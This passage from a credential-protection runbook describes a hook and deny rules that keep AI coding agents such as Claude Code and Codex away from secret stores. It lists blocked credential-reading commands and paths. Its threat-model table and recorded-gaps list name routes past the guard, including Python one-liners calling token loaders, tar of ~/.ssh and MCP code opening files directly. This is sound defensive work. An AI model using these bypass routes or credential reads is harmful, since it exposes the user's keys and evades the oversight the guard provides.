SHELL-LITERAL/SHELL-OUT/WHOLE-ENV, then tail reading. Descriptor repair occupies
K4's environment-dump position, using token text plus descriptor metadata in
segment and started-command identities; B's historical string-only identity is
preserved for baseline precedence. The `\x01` fallback above is unchanged.

All scanners, derived shell/code texts, runner starts, language/interpolation
frames and tails share one budget: characters 400,000, texts 10,000, words
1,000,000, reads 500. New linear passes are charged before work, at least
`max(1, ceil(len(text)/32))` character units, alongside storage-width shlex charges,
derived-text/word charges and one read per started-command reread. Cache identity
includes semantic mode and token metadata. Output-context membership uses an
O(1) aggregate updated with stack frames, not an ancestor scan per environment
token. Budget exhaustion reaches `command_too_complex`; unexpected helper errors,
including MemoryError and RecursionError, reach the one-line `guard_error` handler.
The 200,000-character cap and 10-second hook timeout remain: a timeout still does
not block, so bounded timing is an acceptance gate.

**Repair corrections (2026-09-30).** The independent K4 reviews disproved the
earlier timing and mutation-completeness claims. Gateway assignment/call lookup
and failed JavaScript regex lookahead now build charged indexes once; Request
bindings and their consumers are indexed too. Runner inspection expands only
the started command and reuses the base reading's outer segments. Permanent
tests retain all three review generators, require their real hook responses
within one second, and keep K4's named rows and helper measurements below
0.5 seconds of processor time on the workstation. Each named row starts with
one guarded measurement; each helper starts with one at each of 25,000, 50,000
and 100,000 characters, measuring both helper and whole-check time. After the
first failed absolute or growth criterion, calibration runs once beside that
round: five processor-time measurements of a fixed guard-independent workload
(standard-library shlex over short words and one long quoted word). The host
factor is `min(4.0, max(1.0, min(reference samples) / 0.188))`, using the
workstation's calibrated 0.188 seconds. The minimum prevents one increased
reference sample from relaxing the bound; the 4.0 cap leaves margin above the
recorded hosted macOS slowdown of about 2.8 times (2.6 times for the long-word
row) and bounds the absolute limit at 2.0 seconds. The factor applies only to
the absolute processor-time bounds.

Each helper's growth exponent is computed from **raw** per-size timing minima:
`ln((t100k + 0.005) / (t25k + 0.005)) / ln(4)` must be strictly below 1.5.
The fixed 5 ms allowance is never scaled. This is the criterion of the
child-usage linearity checks; the unadjusted exponent is 1 for linear and 2 for
quadratic growth. After calibration the same first-round samples are rechecked;
another guarded round runs only while a criterion still fails, with a maximum
of three rounds and the per-size raw minimum over all rounds run so far.
This follows [CPython's `timeit` repetition guidance](https://docs.python.org/3/library/timeit.html#timeit.Timer.repeat)
and uses its [maintained reference implementation](https://github.com/python/cpython/blob/3.14/Lib/timeit.py)
for the five reference measurements. A clean later sample can resolve timing
noise; three identical quadratic helper rounds of 10, 40 and 160 ms remain
rejected at host factors 1.0, 2.6 and 4.0. The timed `check()` calls of the
helper rounds and the nesting probe, which run inside the test process, run
with the cyclic garbage collector disabled, so no collection of any generation
runs inside a timed window, and with its prior state restored, as
[`timeit.Timer.timeit` does by default](https://docs.python.org/3/library/timeit.html#timeit.Timer.timeit)
([source](https://github.com/python/cpython/blob/58ed60b7415e218ce3d608302e39b5e55bfb0e88/Lib/timeit.py#L177-L183)),
because a full collection costs in proportion to the whole test process's heap,
not to the input, so one that lands inside a timed window is not the helper's work.

An unscaled first-round pass costs one guarded measurement per named row,
three per helper, and no references. Calibration alone can accept the first
round without another guarded measurement. At most, each row uses three guarded
measurements and five references, and each helper uses nine guarded measurements
and five references. The separate nesting probe uses two guarded measurements
per round, repeating only on failure up to three rounds, without calibration.
The mutation gate counts only
assertion failures from its named permanent tests, with passing unmutated
controls. Shared-budget thresholds come from isolated stage measurements;
each stage must fit alone and only their combined work exceeds the threshold.
Sources are the K4 contract and amendments, the two independent repair reviews,
and `tests/test_secret_path_guard.py`; final counts belong to the repair receipt.

The differential classifies every loosening using an independent reference
recognizer and baseline verdicts; candidate eligibility is not evidence of its
own correctness. Counts belong to the final acceptance receipt after actual
runs, not the historical K3 measurements above. K4 has exactly one authorized
loosening category (F), no data-consumer loosening, and the A5 reason transitions
inside F described above. Refusal reasons outside F remain unchanged.

**Residuals.** Opaque external scripts, indirect/computed shell-outs and unsupported
languages remain outside semantic analysis, subject to existing text rules.
Inline shell-out reading is deferred: the exact inert control
`python3 -c 'import subprocess;subprocess.run(["keyctl", "list", "@u"])'` remains
allowed where B allowed it, as does the corresponding Node execFileSync control;
keyring payload/code protections still apply. Inherited ps personalities, renamed
runner/canary scripts, runner usage through uv, grouped/non-echo/printf store
producers, assignments from an earlier tool call, `busctl`/`gdbus`/`launchctl`
writes, hidden/encoded/non-covered gateway URLs and other ports, relocated
credential trees (including unresolved XDG default expressions), non-Bash tools
and same-uid access remain limits. None grants an exception to a base refusal.
The read-only re-check of the repair round (2026-10-01) left five residuals for
the next guard change. Two gateway forms are allowed, as K3 allows them: a
`Request` passed to `urlopen` by keyword after the body (`urlopen(data=b"x",
url=r)`) and an augmented member assignment (`r.full_url += "/x"`). Two K4
refusals are false: an incomplete computed argv item (`subprocess.run(["printenv"
+ "-safe"])` refuses `environment_dump`) and a `command -v`/`-V` lookup read as
an assignment (`command -v export K=demo; ...` before a store refuses
`keyring_store_literal`). A generated 193,560-character urllib command whose
`urlopen` calls all reuse one `Request` takes about 1.9 s in the real hook on
the workstation, below the hook timeout but above the 1 s target, because each
URL occurrence revisits every consumer.
The hook is not a security boundary, does not inspect arbitrary script files or
MCP tool calls and never reads credentials or contacts a gateway while checking.

## Threat model and what each guard stops

| Layer | Stops | Does not stop |
| --- | --- | --- |
| Store outside every worktree, plus `.gitignore` for `.env*`, `*.env`, `*.key`, `*.pem`, `stored_tokens` and other native-store names (the generic `token` basename is deliberately not listed: it is too broad to ignore repository-wide, and `scripts/credential_status.py`'s `SENSITIVE_BASENAME` makes the same choice) | committing a credential by accident | a value pasted into a tracked file, or a tracked file literally named `token` |
| `scripts/git-hooks/pre-commit` (gitleaks on staged changes) | known secret shapes in a commit, before it is made | `--no-verify`; clones where `core.hooksPath` is not set; values with no recognizable shape |
| CI gitleaks (`validate.yml`), GitHub secret scanning and push protection (public repo) | pushes and history that contain known provider patterns | anything not yet pushed; custom formats. This layer only reacts after the fact |
| Project `.claude/settings.json` deny rules | Claude's Read/Edit tools on the listed paths (including both Hugging Face token files at their default location, and since 2026-09-27 the [home and tool credential stores](#home-and-tool-credential-stores-2026-09-27)); `printenv`, `env`, `gh auth token`, `hf auth token`, `git credential fill`, `gh auth git-credential`; through the `**/` twins, Context Mode's `ctx_execute_file` and `ctx_index` on the same paths | Python or other subprocesses that open the files themselves, including code run by Context Mode's `ctx_execute` or `ctx_batch_execute` that opens a file directly; forms that do not match the rule text; a moved `HF_HOME`; sessions started outside this repository |
| `scripts/hooks/secret_path_guard.py` (PreToolUse, Bash; project settings and, through the profile installer, user settings) | commands that name a store path (the Hugging Face token files also as `$HF_HOME/...` or `$XDG_CACHE_HOME/huggingface/...`); read or copy the whole Hugging Face home; read `/proc/*/environ` in any spelling; dump the environment; reference a secret variable; trace a process; print a native token (`gh auth token`, `hf auth token`, `huggingface-cli ... token`, `--show-token`, and the credential-helper forms `git credential fill`, `git credential-<helper> get`, `gh auth git-credential` that `gh auth setup-git` enables); run a reader (`cat`, `sed`, `awk`, `jq`, ...), copy (`cp`, `scp`, `rsync`) or search (`grep`, `rg`, `ag`, `ack`, `git grep`, `find -exec` with a reader) on a pointer variable such as `$HF_TOKEN_PATH`, a `.env`/`*.env` file, a secret variable **name**, or any path the template's credential-store `Read` denies cover: anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, an OmniRoute data directory, a `shell_snapshots` directory or the OpenHands runtime-worker `runtime-workers/openhands/secrets` directory, each directory and a glob in it, the Docker home, the Docker, git-credential, netrc, npm and PyPI files, and `nativestack/*.key` ([2026-09-27](#home-and-tool-credential-stores-2026-09-27), which on an RTK host is what stops `cat` of them); redirect a pointer variable such as `$HF_TOKEN_PATH` into a command (`<`, `<<<`, `<>`); turn on shell tracing or verbose mode (`bash -x`, `sh -x`, `set -x`, `set -v`, `set -o xtrace`) in a command that sources a credential file; dump the environment (`env`, `printenv`, `export -p`, `declare -p/-x`, inline `os.environ`) after sourcing one; for the kernel keyring ([Guard coverage](#guard-coverage-2026-09-26)), read a payload (`keyctl print`, `pipe`, `read`, `dh_compute`, every direct `list` or `rlist` invocation regardless of target, or a keyring payload read in inline interpreter code), print part of the Tavily key (`tvly auth` without `--json`), or give `kernel_keyring.py exec` or `tvly-keyring` a command that breaks any rule above, names the injected variable or dumps the environment it inherits, also behind a launcher; each text rule also reads the command after quote removal, and every rule reads the command an `rtk` invocation runs ([2026-09-27](#home-and-tool-credential-stores-2026-09-27)) or a `systemd-run` starts, and so does the body of a command substitution inside double quotes (`echo "$(printenv)"`), and `ps -E` or a dashless `ps` cluster with a capital `E` is an environment dump like `ps e`, and so is `systemctl show-environment`, a service manager's whole environment block; a secret variable set through `systemd-run`'s `-E`, `--setenv` or `-p Environment=` is blocked ([2026-09-29](#launchers-substitutions-and-manager-environments-2026-09-29)); K4 also inspects credential-runner starts, applies the exact local gateway HTTP matrix and CLI refusal, blocks manager secret imports/writes and literal keyring-store feeds, checks explicit ps selectors and canary terminal triggers, protects both added Claude secret names and complete OmniRoute data trees, and reads interpreter whole-environment output/unknown access plus literal shell-outs in here-document regions ([K4](#k4-runner-commands-and-bounded-interpreter-reading-2026-09-30)) | only exact top-level form F replaces both base body-as-shell readings; rejected forms and data bodies retain B, inline code receives WHOLE-ENV but no new shell-out reading, and this remains accident prevention rather than a security boundary; any Context Mode `ctx_*` call (an MCP tool: the hook is registered for `Bash`, and the guard passes every other tool), a program that imports a loader and prints the result (including `huggingface_hub.get_token()`), an inline interpreter that opens `$HF_TOKEN_PATH` itself (for example `python3 -c "...open(os.environ['HF_TOKEN_PATH'])..."`, which never spells a literal `$HF_TOKEN_PATH`), an archiver such as `tar` on the Hugging Face home, a recursive read or copy of an ancestor directory (`~`, `$HOME`, `~/.cache`, or `$XDG_CACHE_HOME` with a trailing `/` or `/*`) that reaches the Hugging Face home without naming it, a relative read after `cd` into the Hugging Face home, `$HF_HOME/.`, the credential-store gaps recorded under [2026-09-27](#home-and-tool-credential-stores-2026-09-27) (an archiver, a copy or search of `~/.config`, `~/.codex`, `~/.claude` or the runtime-worker state directory, a client that prints its own store, an OmniRoute `DATA_DIR` elsewhere, and `docker exec` into the OpenHands agent-server or a full `docker inspect` of it, which show its session key), obfuscated or renamed paths, a script file that sources and traces on its own, a shell or interpreter started by `exec` that reads its commands from a pipe or a script file, a renamed copy of `kernel_keyring.py`, a variable name assembled at run time, a launcher that takes its command as one string (`script -c`), the macOS `secret run NAME -- command` form, and anything else that is not literal text in the command |
| Codex `[shell_environment_policy] inherit = "none"` | credential and broker variables in the launcher environment reaching Codex shells (measured, see below) | file reads. The setting controls which environment variables a Codex shell inherits, not which files it can open. A Codex shell can still `cat` a store file. The file-level mitigations are the store's location outside every workspace and the Codex sandbox; Codex 0.155.1 has no documented per-path read deny |

In plain terms: an agent running as your user in `bypassPermissions` mode can
still read the Alpaca paper keys. It only has to run a Python one-liner that
calls a loader through `$PAPER_ENV_FILE`. The deny rules and the hook stop
accidents. They are not a security boundary. The Claude Code docs say so
themselves: Read/Edit deny rules "don't apply to ... arbitrary subprocesses",
and Bash rules are "not a security boundary around the program". The only
OS-level floor is the Claude Code sandbox with `credentials.files` deny, and it
covers only Bash commands run inside the sandbox. This host has not enabled
it. Enabling it changes network and filesystem behaviour for every command, so
it is a separate change that has to be measured first. The decision accepts
agent read access to the **paper-only** keys as a residual risk. It accepts
the same for the Hugging Face token, which this runbook limits to reading
public gated repositories: a one-liner that calls
`huggingface_hub.get_token()` also passes the guard. The same residual covers
Context Mode: `ctx_execute` and `ctx_batch_execute` run arbitrary code with the
server's file access (upstream `README.md:1575` at the reviewed revision).
Context Mode checks shell code, and the shell commands it recognises inside
other languages, against the `Bash(...)` deny rules (`src/server.ts:1111-1150,
1744-1750, 3779-3782`), but nothing mediates a file that such code opens
itself, such as Python `open()` or Node `fs.readFileSync`, so a read through
them is part of this accepted risk. The built-in sandbox does not change that: it
applies to Bash, PowerShell and Monitor commands, and MCP servers run
unconstrained on the host
([sandboxing](https://code.claude.com/docs/en/sandboxing),
[sandbox environments](https://code.claude.com/docs/en/sandbox-environments)).
Closing it needs OS-level containment around the whole Claude Code session,
which has to be measured before it is adopted. Live broker
keys are out of scope for this scheme and must not be stored this way.

Other boundaries that are recorded but not closed:

- **WSL2:** a `0600` mode applies only inside the Linux guest. Windows-side
  processes, including Windows-side clients, can read
  `\\wsl.localhost\<distro>\home\...` as the Windows user.
- **Process environment:** Grafana's unit uses `EnvironmentFile=`, so its
  admin values are in that service's process environment. This is accepted
  because Grafana listens on loopback and normal observation uses the
  anonymous Viewer. The subshell pattern above puts values in one child's
  environment for the lifetime of that child.
- **Stores that keep output:** once a value is printed, copies can remain in
  Claude Code transcripts (`~/.claude/projects/`), RTK full-output recall,
  the context-mode knowledge base, ai-memory observations and the local
  OpenTelemetry/Loki stack. See [Telemetry](#telemetry-and-pasted-values).

### Telemetry and pasted values

Claude Code exports prompt, tool and API content to OpenTelemetry only when
these `env` flags are truthy (Claude Code monitoring docs, fetched
2026-09-24): `OTEL_LOG_USER_PROMPTS`, `OTEL_LOG_ASSISTANT_RESPONSES` (falls back
to the prompt flag when unset), `OTEL_LOG_TOOL_DETAILS` (Bash commands and tool
input), `OTEL_LOG_TOOL_CONTENT` (tool output) and `OTEL_LOG_RAW_API_BODIES`
(the whole conversation; the docs say enabling it implies consent to what
the other three reveal). When any of them is on, a value pasted into a prompt
or passed through a tool call is copied into the local OpenTelemetry/Loki
store. Whatever the flags say, the transcript and the ai-memory observations
also keep it. **A pasted key must be rotated**, then its copies purged
(see [Rotation and incidents](#rotation-and-incidents)).

`python3 scripts/credential_status.py --client-guards` reports each flag as
true or false from the key names in `~/.claude/settings.json` and never
prints a value. Measured on this host on 2026-09-24:
`CLAUDE_CODE_ENABLE_TELEMETRY` is on and all five content flags are present
and **false** in `~/.claude/settings.json`. There is no `settings.local.json`
or managed settings file, and the flags are not in the process environment.
The same was true of the two retained settings backups from 2026-09-23. The
earlier text of this page said the user settings enabled tool-content and
raw-body logging; this measurement does not support that statement, so it is
withdrawn. The settings template sets four of them to `"false"`, so
`apply_claude_settings.py` writes them off on a new host. `OTEL_LOG_TOOL_DETAILS`
is `"1"` since the [invoke-rate change](decisions/2026-09-26-tool-invoke-rates.md),
under the dated exception below. The checker still reports
`claude_telemetry_logs_content: true`, because it reads the client flag.

Recommendation, as a user decision: keep tool-content and raw-body logging
off for as long as broker keys exist on the host, and tool details too,
except for the dated exception below. Turning any of them on is a deliberate
choice to copy tool traffic into the local store; the checker then reports
`claude_telemetry_logs_content: true`.

**Exception: tool details (user decision, 2026-09-26).** Asked in the
workstation coordinator session whether to enable `OTEL_LOG_TOOL_DETAILS=1`
with name-only filtering in the Collector, the user answered "1 and full sota
convergence practice we proceed". `adoption/templates/claude.settings.template.json`
changed after `v2026.09.26.2` accordingly: it sets the flag to `"1"`, where a
host at that tag writes `"false"`. Bash commands and tool input still reach the
local Collector, so the control sits there
([decision record](decisions/2026-09-26-tool-invoke-rates.md)):

- `transform/tool_names`, in both logs pipelines before `transform/privacy`,
  copies out of `tool_parameters` only the MCP server and tool names and the
  Agent tool's `subagent_type`, plus one boolean, `shell_rtk`, from the first
  word of `bash_command`. It never reads `full_command`. Skill names come only
  from Claude Code's own `skill_activated` event. MCP server, MCP tool and
  skill names that are not a short identifier become `other`, and an agent
  type outside Claude Code's built-in agents and the workflow child becomes
  `custom`.
- `tool_parameters` (which carries `full_command`) and `tool_input` are
  deleted in that processor. None of them, nor `user.email`, the Skill tool's
  `skill_name` or a workflow name, is on any `transform/privacy` allowlist, so
  none is exported to Loki or `events.jsonl`.
- Canary proof (local integration, 2026-09-26): a scratch replay of real
  Claude Code and Codex captures plus 31 synthetic records, through the
  pinned otelcol-contrib 0.161.0 and a scratch Loki 3.7.8, looked for 72
  known strings: Bash commands, prompts, a workflow script, search queries,
  Codex arguments and output, and agent messages (31 from the captures, 41
  synthetic). None reached the file exporter or Loki, and no
  `tool_parameters`, `tool_input` or `user.*` key was exported (109 of 109
  checks, historical pre-fix evidence). The live host proof ran on
  **2026-09-26T23:47:42Z-23:49:21Z: 33 passed, 0 failed**, with the **pre-fix
  checker**. That checker did not assert fixed bodies and omitted short
  forbidden strings. The corrected structural checker was re-run offline
  against the retained events file: **270 records in 29 batches, 26 forbidden
  strings, zero hits or banned keys; 3 passed, 0 failed** (2026-09-27T03:55Z;
  that file has since rotated out, so the run cannot be repeated). Raw Loki
  bodies from that proof were not retained, so that sink has not been
  re-verified with the corrected checker. The repaired synthetic-only replay
  passed natively on the pinned Collector and Loki with scratch ports:
  **68 passed, 0 failed**. These limits and the historical live output are
  retained in the [evidence receipt](../evidence/artifacts/tool-invoke-rates-20260926/README.md).

Only sessions started after the flag changes carry names. The other four
flags stay `"false"`, and the recommendation above still covers them.

### Measured on this host (2026-09-24, Claude Code 2.1.281, headless `bypassPermissions`)

| Probe | Result |
| --- | --- |
| `printenv NO_SUCH_VAR` | blocked by deny rule `Bash(printenv *)` |
| `ls ~/.config/native-agent-stack` | blocked by the hook (`credential_store_path`) |
| Read tool on a gitignored `.env.probe` fixture | denied by `Read(.env.*)` |
| `cat .env.probe` in Bash | **ran**. The `Read(.env.*)` deny did not stop it, with or without the `!` carve-outs. The hook now blocks readers on `.env` files (`dotenv_read`) |
| `git rev-parse --is-inside-work-tree` | ran (control) |

These probes are a local integration check with a harmless fixture. They
did not test the sandbox, Codex, or a real credential.

## User-level guards (deployed by the Claude profile)

The project file applies only to sessions started in this repository. The
managed Claude user profile carries the same guards to every session on a
host, and the documented installer deploys them on every new PC
([`adoption/bootstrap.md`](../adoption/bootstrap.md) step 4a):

- `python3 tools/adoption/install_claude_profile.py --only guard` copies
  `scripts/hooks/secret_path_guard.py` to `~/.claude/hooks/secret_path_guard.py`,
  refusing unless its sha256 matches
  [`adoption/hooks/claude/SHA256SUMS`](../adoption/hooks/claude/SHA256SUMS)
  (paths relative to that file, so `sha256sum -c SHA256SUMS` also verifies it).
- [`adoption/templates/claude.settings.template.json`](../adoption/templates/claude.settings.template.json)
  carries every deny rule from `.claude/settings.json` and a `PreToolUse`
  `Bash` hook that runs the installed guard. `render_config.py` and
  `apply_claude_settings.py` merge both into `~/.claude/settings.json`; the
  merge keeps host-only rules and hooks. The hook command does nothing when the
  guard file is missing, so applying the settings before installing the guard
  never blocks every Bash call; `--client-guards` reports
  `claude_user_secret_guard_hook: false` until both are in place.

In this repository both the project hook and the user hook run. They are the
same file, so the second run only repeats the verdict. Because the user hook
runs in every project, its rules avoid ordinary work: copying a `.env.example`
to `.env`, writing to a `.env` file, sourcing one to run a program, `set -x`
without sourcing, and `/proc` reads other than `environ` all pass. One
deliberate trade-off remains: a shell search for a listed secret variable
name, such as `grep -rn GITHUB_TOKEN .github`, is blocked even in code; use
the Grep tool, which Claude's `Read` deny rules cover, for that search. `tests/test_secret_path_guard.py`
checks that an installed host copy is byte-identical to the repository file
(skipped in CI and on a host without it). After the guard or the deny rules
change, for example when the Hugging Face rules were added, rerun
`python3 tools/adoption/install_claude_profile.py --only guard` and render and
apply the settings template again on each host. That test fails on a host
until its guard copy is replaced.

For a host that does not use the template, merge the same rules by hand under
`permissions.deny` in `~/.claude/settings.json`:

```json
"Read(~/.config/native-agent-stack/**)", "Read(**/.config/native-agent-stack/**)",
"Edit(~/.config/native-agent-stack/**)",
"Read(~/.config/ecosystem-observability/*.env)", "Read(**/.config/ecosystem-observability/*.env)",
"Read(~/.config/nativestack/*.key)", "Read(**/.config/nativestack/*.key)",
"Read(~/.claude/.credentials.json)", "Read(**/.claude/.credentials.json)",
"Read(~/.codex/auth.json)", "Read(**/.codex/auth.json)",
"Read(~/.config/gh/hosts.yml)", "Read(**/.config/gh/hosts.yml)",
"Read(//proc/*/environ)", "Read(**/proc/*/environ)",
"Read(~/.cache/huggingface/token)", "Read(**/.cache/huggingface/token)",
"Read(~/.cache/huggingface/stored_tokens)", "Read(**/.cache/huggingface/stored_tokens)",
"Read(~/.ssh/**)", "Read(**/.ssh/**)", "Read(~/.gnupg/**)", "Read(**/.gnupg/**)",
"Read(~/.aws/**)", "Read(**/.aws/**)", "Read(~/.azure/**)", "Read(**/.azure/**)",
"Read(~/.kube/**)", "Read(**/.kube/**)", "Read(~/.docker/config.json)", "Read(**/.docker/config.json)",
"Read(~/.git-credentials)", "Read(**/.git-credentials)", "Read(~/.netrc)", "Read(**/.netrc)",
"Read(~/.npmrc)", "Read(**/.npmrc)", "Read(~/.pypirc)", "Read(**/.pypirc)",
"Read(~/.omniroute/**)", "Read(**/.omniroute/**)", "Read(~/.config/omniroute/**)", "Read(**/.config/omniroute/**)",
"Read(~/.codex/shell_snapshots/**)", "Read(**/.codex/shell_snapshots/**)",
"Read(//mnt/*/Users/*/AppData/Roaming/omniroute/**)", "Read(**/mnt/*/Users/*/AppData/Roaming/omniroute/**)",
"Read(//mnt/*/Users/*/.omniroute/**)", "Read(**/mnt/*/Users/*/.omniroute/**)",
"Read(~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/**)",
"Read(**/.local/state/native-agent-stack/runtime-workers/openhands/secrets/**)",
"Edit(~/.bashrc)", "Edit(~/.profile)", "Edit(~/.zshrc)",
"Bash(printenv)", "Bash(printenv *)", "Bash(env)", "Bash(gh auth token *)",
"Bash(hf auth token)", "Bash(hf auth token *)",
"Bash(git credential fill*)", "Bash(gh auth git-credential *)"
```

Each `~/` or `//` Read rule has a `**/` twin (changed 2026-09-26). Claude Code
reads `~/` and `//` as anchors and bounds a `**/` pattern to the current
directory ([permissions](https://code.claude.com/docs/en/permissions)). Context
Mode 1.0.169 applies the same Read deny rules to the paths `ctx_execute_file`
and `ctx_index` receive, but it compiles each pattern literally, without
expanding `~/` or `//`, and tests it against the path's raw, resolved and
canonical absolute forms (`src/security.ts:101-135, 616-655` at the reviewed
revision `6f0cc684`; upstream tracks the anchors as #1075). Each form is
therefore inert in the other engine, and the pair covers both. The project
settings and the template also carry `Read(**/.env)` and `Read(**/.env.*)`
right after `Read(.env)` and `Read(.env.*)`, before `Read(!.env.example)` and
`Read(!.env.*.example)`: a `!` carve-out reaches only the rules listed before
it in the same file, so a twin placed after the carve-outs would deny
`.env.example` again. Context Mode has no `!` carve-outs, so its
`ctx_execute_file` refuses `.env.example` as well; read that file with the
native Read tool. `apply_claude_settings.py` inserts a missing template rule
next to its template neighbours, so it keeps this order on a host whose file
already holds the carve-outs.

### Home and tool credential stores (2026-09-27)

The template and the project settings also deny Claude's file tools the
credential stores that other tools keep in the home directory: `~/.ssh`,
`~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, `~/.docker/config.json`,
`~/.git-credentials`, `~/.netrc`, `~/.npmrc` and `~/.pypirc`, each with its
`**/` twin (corroborated by trailofbits/claude-code-config at `2109be9`,
`settings.json`). Three more stores join them:

- **OmniRoute's data directory.** It holds the gateway's SQLite database,
  with the provider OAuth tokens and API keys it holds, its logs and
  backups (`.env.example`, lines 36-41), and it may hold `.env` layers. Without `DATA_DIR`, upstream uses a legacy `~/.omniroute` when it
  exists, else `%APPDATA%\omniroute` on Windows, else
  `$XDG_CONFIG_HOME/omniroute`, else `~/.omniroute`, and it falls back to
  that default when a configured `DATA_DIR` is not writable
  (diegosouzapw/OmniRoute `src/lib/dataPaths.ts` at `a58000c7`, lines 40-62
  and 175-190). The rules deny `~/.omniroute`, `~/.config/omniroute` and,
  for a Windows gateway reached from WSL2, both Windows defaults under the
  default `/mnt/<drive>` mount. The template alone carries the two
  `//mnt/*/Users/*/...` rules. A gateway with a `DATA_DIR` elsewhere needs
  its own `Read(//<DATA_DIR>/**)` rule and twin in that host's user
  settings; never commit such a path. `Read(**/.env)` does not cover a
  `.env` outside the project, so these directory rules are what keep the
  gateway's `.env` from the Read tool.
- **Codex shell snapshots.** With `shell_snapshot` on, Codex writes
  `$CODEX_HOME/shell_snapshots/*.sh`, which record `declare -xp` for every
  exported name and so hold exported values (openai/codex `rust-v0.157.1`,
  `codex-rs/shell-command/src/shell_snapshot_exports.rs`), at mode `0644`, as a
  GPT-6 probe of the landscape-sweep lane reproduced with its provider key
  ([sweep README](../tools/sota-convergence/landscape-sweep/README.md)). The rules cover
  `~/.codex/shell_snapshots`; a lane-local `CODEX_HOME` elsewhere is covered
  only by the guard's reader rule below.
- **OpenHands runtime-worker session keys (2026-09-28).** For each attempt
  the runtime worker's host driver (PR #425, which adds the
  `openhands-session` inventory row) generates an agent-server session key
  and writes it at mode `0600`, in a `0700` directory, to
  `~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/`:
  `<run-id>-<arm>.server.env` in Docker env-file syntax
  (`OH_SESSION_API_KEYS_0=<value>`) and `<run-id>-<arm>.headers`, a header
  line that curl reads with `-H @file`. It deletes both once the attempt's
  containers are confirmed removed. The template alone carries
  `Read(~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/**)`
  and its twin, because the user settings reach every session on the host.

The template alone adds `Edit(~/.bashrc)`, `Edit(~/.profile)` and
`Edit(~/.zshrc)`: the operator, not an agent, writes the pointer exports of
[Picking up in a new session](#picking-up-in-a-new-session).

What this changes, from the [permissions](https://code.claude.com/docs/en/permissions)
reference: a `Read` deny also blocks Edit and Write on the path, applies to
the file commands Claude Code recognizes in Bash (`cat`, `head`, `tail`,
`sed`, `tee`, redirections) and, best effort, to Grep and Glob, and it
holds in `bypassPermissions` too
([permission modes](https://code.claude.com/docs/en/permission-modes)). It
does not stop `grep -r` run inside the directory or a subprocess that opens
the file itself. The whole `~/.ssh` directory is denied, so Claude's file
tools cannot read `config`, `known_hosts` or `*.pub` either; carving those
out with `Read(!...)` rules is an open user decision. Because a `**/` twin
matches under the working directory, a project's own `.npmrc`, `.netrc` or
`.pypirc` is denied as well, as a project `.env` already is.

**On a host that runs RTK's Claude hook, which the template registers
(`rtk hook claude`), that Bash coverage does not reach `cat`, `head` or
`tail -n`.** RTK 0.50.0 rewrites them to `rtk read FILE` (rtk-ai/rtk
`v0.50.0`, `src/discover/rules.rs`), and Claude Code evaluates its
permission rules against the command a hook returns
([hooks](https://code.claude.com/docs/en/hooks), PreToolUse
`updatedInput`). `rtk read` is not a file command it recognizes, and `rtk`
is not one of the wrappers it strips (permissions, "Wrappers"). RTK leaves
a command alone only when a `Bash(...)` deny rule matches it and ignores
`Read(...)` rules (`src/hooks/permissions.rs`, `append_bash_rules`). In a
probe project holding the template's 86 deny rules, `rtk hook check`
rewrote `cat ~/.ssh/config`, `cat ~/.ssh/*`, `head -n 5
~/.aws/credentials` and `tail -n 3 ~/.kube/config` to `rtk read ...` and
`grep token ~/.kube/config` to `rtk grep ...`. It left a bare `tail FILE`,
`sed`, `tee` and input redirections unchanged, and the `Read` denies still
apply to those
([decision record](decisions/2026-09-27-claude-harness-settings.md#evidence)).
The guard is what stops the rewritten readers. It reads the command as
Claude wrote it, before any rewrite, and its deny wins over RTK's rewrite:
matching hooks run in parallel, and `deny` outranks every other decision a
hook returns ([hooks](https://code.claude.com/docs/en/hooks): `deny` >
`defer` > `ask` > `allow`). The permissions reference names such a hook as
the way to inspect the full command text ("What a Bash rule doesn't
match").

`scripts/hooks/secret_path_guard.py` therefore blocks a reader, copy or
search of every path those `Read` denies cover as `credential_file_read`.
That is anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`,
an OmniRoute data directory, any `shell_snapshots` directory or a
`runtime-workers/openhands/secrets` directory (since 2026-09-28; its
`.server.env` files, which the dotenv rule already caught, are now reported
as reads of the directory), each
directory itself and a glob in it (`cp -r ~/.ssh`, `grep -r BEGIN
~/.ssh`, `cat ~/.aws/*`, `find ~/.ssh -type f -exec cat {} +`). It also
covers the files `~/.docker/config.json`, `~/.git-credentials`,
`~/.netrc`, `~/.npmrc` and `~/.pypirc`, any `*.key` in a `nativestack`
directory, and the Docker home as a whole (`cp -r ~/.docker`, as for the
Hugging Face home). Like the template, it
covers `config`, `known_hosts`, `*.pub` and a key under any name; a
`~/.ssh` carve-out would change both. `tests/test_secret_path_guard.py`
derives a path from every anchored `Read` deny of the template and the
project settings, and expects `cat`, `head -n`, `tail -n` and `rtk read`
of that path to be blocked.

Clients that use a key or a store (`ssh -i`, `ssh-add`, `ssh-keygen -y
-f`, `kubectl --kubeconfig`, `curl --netrc`, `gh ssh-key add`, `docker run
--env-file`), listings, `stat` and `chmod` pass, because the user hook runs
in every session.
Four clients name a store as the operand of a program the guard treats
as a reader, so they are blocked too: `scp -i KEY`, `rsync -e 'ssh -i
KEY'`, `gpg --homedir ~/.gnupg` and `curl -H @FILE` on an OpenHands header
file named by its path. A key named in `~/.ssh/config` or
loaded with `ssh-add`, and `gpg` without `--homedir`, avoid that. A search's own
pattern is not a file it reads (grep(1): `PATTERNS [FILE...]`), so `rg
shell_snapshots docs` and `grep -nF '.ssh/id_ed25519' README.md` pass.
When `-e`, `-f` or an option that can take a file or glob comes first
(`--include .netrc`, rg's `-g`), every argument counts, erring toward
blocking. `cp -t DIR` makes all its other operands sources (cp(1)), and
dd's `of=` file is written, not read.

Recorded gaps, asserted in `tests/test_secret_path_guard.py`:

- a relative read after `cd`;
- a client that prints its own store (`kubectl config view --raw`, `gpg
  --export-secret-keys`);
- a program that opens a store itself, such as `sqlite3` on the gateway
  database;
- an archiver (`tar czf k.tgz ~/.ssh`);
- a glob that names a store only after the shell expands it (`~/.n*rc`);
- a copy or search of an ancestor of a store (`~/.config`, `~/.codex`,
  which holds `shell_snapshots`, or the runtime-worker state directory
  `runtime-workers/openhands`, which holds `secrets`);
- a copy or search of a directory that holds an older store file
  (`~/.claude`, whose `.credentials.json` the guard blocks only by name);
- an OmniRoute `DATA_DIR` elsewhere;
- a store path the guard sees only after the shell or the program resolves
